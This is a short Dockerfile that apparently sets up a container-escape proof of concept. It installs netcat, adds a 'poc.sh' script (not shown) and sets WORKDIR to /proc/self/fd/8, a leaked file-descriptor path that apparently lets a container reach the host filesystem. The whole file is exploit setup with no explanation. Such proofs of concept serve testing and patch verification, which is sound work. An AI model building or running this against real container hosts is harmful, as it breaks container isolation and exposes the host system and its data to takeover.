FROM ubuntu:latest
RUN apt-get update -y && apt-get install netcat -y
ADD ./poc.sh /poc.sh
WORKDIR /proc/self/fd/8
